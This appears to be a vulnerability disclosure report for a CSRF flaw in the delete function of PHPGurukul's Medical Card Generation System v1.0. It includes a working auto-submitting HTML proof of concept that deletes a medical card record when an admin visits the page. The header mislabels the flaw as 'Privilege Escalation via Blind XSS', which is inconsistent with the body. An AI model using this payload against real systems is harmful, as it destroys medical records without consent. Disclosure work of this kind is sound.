**Project Name & Repo URL:**
[ Medicalcard Generations System](https://phpgurukul.com/medical-card-generation-system-using-php-and-mysql/)

**Vulnerability Type:**
Privilege Escalation via Blind XSS

**Affected Version(s):** v1.0

**💣Vulnerability Description:**
A Cross-Site Request Forgery (CSRF) vulnerability exists in the Manage Card functionality `(/mcgs/admin/manage-card.php)` of the Medical Card Generation System developed by PHPGurukul. The vulnerable endpoint allows an authorized admin to delete medical card records by sending a simple GET request without verifying the origin of the request (missing CSRF token and missing Origin/Referer validation). An attacker can craft a malicious webpage that, when visited by a logged-in admin, will silently trigger the deletion of a medical card record without the admin's knowledge or consent. This compromises the integrity and availability of critical medical data.

**👩‍💻Impact:**
Unauthorized Medical-Card Detail Deletion.

**🛜Proof-of-Concept (PoC):**

1)There was a delete functionality where only authenticated admin can delete medical-card information.
![1](https://github.com/user-attachments/assets/6284da25-a49b-468f-ae1d-6023548d652f)
2) HTML code to send GET request to the endpoint `/mcgs/admin/manage-card.php`.
```
<html>
  <body>
    <form action="http://127.0.0.1/mcgs/admin/manage-card.php">
      <input type="hidden" name="id" value="3" />
      <input type="hidden" name="del" value="delete" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
3)Use the HTML code and craft a malicious URL.

![2](https://github.com/user-attachments/assets/be7c4f2c-63aa-42e7-bd31-92fff841122a)

4)After Admin clicks on the link, medical-card information will be deleted.
![3](https://github.com/user-attachments/assets/89787d6f-d7c5-47b5-a3c7-25b3e26d1764)
![4](https://github.com/user-attachments/assets/c8565a43-b7a6-469a-a61e-2980a011fbbb)
![5](https://github.com/user-attachments/assets/49735bc4-3edb-42e5-bf94-c958cd8817c4)

**Recommendation:**

Implement of CSRF tokens in admin forms, enforce SameSite cookies, and validate request origin to prevent unauthorized actions.
